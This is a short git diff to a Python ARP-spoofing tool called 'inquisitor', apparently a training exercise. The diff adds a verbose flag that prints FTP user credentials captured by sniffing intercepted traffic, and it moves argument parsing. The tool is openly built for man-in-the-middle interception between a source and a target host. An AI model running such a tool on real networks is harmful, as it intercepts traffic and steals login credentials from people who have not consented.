@@ -9,6 +9,7 @@ import threading
 from getmac import get_mac_address as gma
 from scapy.all import sniff, Raw
 
+
 def parser():
     parser = argparse.ArgumentParser(
         prog='inquisitor',
@@ -33,6 +34,11 @@ def parser():
         'TARGET_MAC',
         type=str,
         help="MAC from target host"
+    )
+    parser.add_argument(
+        '-v', '--verbose',
+        default=False, action='store_true',
+        help="shows ftp user credentials",
     )
     return parser.parse_args()
 
@@ -79,8 +85,6 @@ def parser():
 """
 
 
-
-
 # https://docs.huihoo.com/doxygen/linux/kernel/3.7/uapi_2linux_2if__ether_8h.html
 
 ETH_ALEN        = 6 # Octets in one ethernet addr
@@ -95,7 +99,6 @@ ARPHRD_ETHER    = 1 # Ethernet 10Mbps
 # ARP protocol opcodes.
 ARPOP_REPLY     = 2
 
-args = parser()
 
 def parse_ip(ip_str):
     try:
@@ -106,11 +109,14 @@ def parse_ip(ip_str):
         exit(1)
 
 
+args = parser()
+
 IP_SRC_STR, IP_SRC_BYTE = parse_ip(args.SRC_IP)
 IP_TARGET_STR, IP_TARGET_BYTE = parse_ip(args.TARGET_IP)
 MAC_SRC = args.SRC_MAC
 MAC_TARGET = args.TARGET_MAC
 MAC_ATTACKER = gma()
+VERBOSE_MODE = args.verbose
 
 
 def create_eth_header(mac_target, mac_infected):
@@ -222,7 +228,8 @@ def handle_ftp(payload):
 def parse_ftp_packet(packet):
     if packet.haslayer(Raw):
         payload = packet[Raw].load.decode('utf-8', errors='ignore')
-        handle_loggin(payload)
+        if VERBOSE_MODE:
+            handle_loggin(payload)
         handle_ftp(payload)
 
 
